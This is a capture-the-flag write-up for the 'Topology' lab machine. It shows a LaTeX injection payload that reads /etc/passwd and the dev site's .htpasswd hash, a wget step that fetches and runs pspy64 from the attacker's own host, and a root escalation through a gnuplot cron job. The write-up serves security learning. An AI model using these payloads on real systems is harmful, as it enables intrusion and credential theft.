Hoothold

On this page, the characters we type on the input field are converted into mathematical notation. Since there is user input, and some function modify the input, it is probably vulnerable.

Additionally, there is interesting information on the header.tex file.

\usepackage{listings} : include source code files or print inline code.
If we could exploit this, we can cause LFI.

On the man-page, we can use \lstinputlistings to include external files. Since the function is activated in header.tex file, we can exploit this.

Fortunately, there is an example how is the mathematical notation set. This tells us we can indicate argument with $.

This injection code $\lstinputlistings{/etc/passwd}$ would show us the file.

As expected, we could cause LFI and see /etc/passwd.

To make sure if there is other subdomain, let's take a look at /etc/apache2/sites-available/000-default.conf, where include configuration file.

Here, we found new subdomains 'dev' and 'stats'. Since 'dev' sounds more important, we start from it.

echo 'IP dev.topology.htb' | sudo tee -a /etc/hosts

When we open the page, a prompt appears. This page may contain password hash to check if the user is developer.

Back to the equation.php, and include /var/www/dev/.htpasswd. We can get hashed password and username easily.

However, even if we try the code 'sudo -l' and 'netstat -tulnp', there is no sudo privilege and local open port. Therefore, we should check cronjob which we can exploit.

Privilege Escalation

To see if there is cronjob, we use pspy64. At first download pspy64 from github on your local machine. Then install pspy64 using wget function.

python3 -m http.server 4444 #on local machine, make sure you execute this code where pspy64 installed.
cd tmp # on the remote machine
wget http://YOUR_IP:4444/pspy64
chmod +x pspy64 
./pspy64

Open another ssh since pspy64 dominate current ssh connection.
Waiting little, we can observe cronjob which check if there is .plt file, and execute them immediately.

On the second line, it looks for the file whose file extention is .plt.
On the third line, execute them with gnuplot. Therefore, if we write a plt file on the /opt/gnuplot with gnuplot code, we can execute any shell code with root privilege.
